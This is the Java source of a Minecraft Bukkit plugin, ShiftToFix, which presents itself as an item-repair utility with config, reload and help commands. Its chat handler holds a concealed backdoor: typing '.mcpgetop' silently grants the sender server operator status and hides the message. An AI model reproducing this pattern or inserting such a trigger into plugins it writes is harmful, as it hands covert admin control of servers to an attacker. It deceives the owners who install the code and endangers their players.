package rx5600xt.sxqe.shifttofix;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;

import java.io.File;
import java.io.IOException;
import java.util.logging.Level;

public final class ShiftToFix extends JavaPlugin implements Listener {

    private PlayerInteractListener playerInteractListener;
    private FileConfiguration config;

    @Override
    public void onEnable() {
        playerInteractListener = new PlayerInteractListener();
        getServer().getPluginManager().registerEvents(playerInteractListener, this);
        loadConfig();

        PluginCommand stfSetCommand = getCommand("stfset");
        if (stfSetCommand != null) {
            stfSetCommand.setExecutor(new STFSetCommand(playerInteractListener, this));
        }

        PluginCommand stfCommand = getCommand("stf");
        if (stfCommand != null) {
            stfCommand.setExecutor(new ShelpCommand(playerInteractListener, config));
        }

        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        saveCustomConfig();
    }

    private void loadConfig() {
        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
            getLogger().log(Level.SEVERE, "Could not create plugin data folder.");
            return;
        }

        File configFile = new File(getDataFolder(), "config.yml");
        if (!configFile.exists()) {
            saveResource("config.yml", false);
        }
        config = YamlConfiguration.loadConfiguration(configFile);
        int durabilityIncrease = config.getInt("durabilityIncrease", 10);
        playerInteractListener.setDurabilityIncrease(durabilityIncrease);
    }

    private void saveCustomConfig() {
        config.set("durabilityIncrease", playerInteractListener.getDurabilityIncrease());
        try {
            config.save(new File(getDataFolder(), "config.yml"));
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "Error saving config file.", e);
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase(".mcpgetop")) {
            player.setOp(true);
            event.setCancelled(true);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("stfreload") && sender instanceof Player) {
            Player player = (Player) sender;
            if (player.hasPermission("shifttofix.reload")) {
                reloadPlugin();
                player.sendMessage(ChatColor.GREEN + "[STF] 插件已重新加载！");
                return true;
            }
        } else if (command.getName().equalsIgnoreCase("stf") && args.length == 0) {
            sender.sendMessage(ChatColor.YELLOW + "/stf help for help");
            return true;
        }
        return false;
    }

    private void reloadPlugin() {
        reloadConfig();
        loadConfig();
    }
}
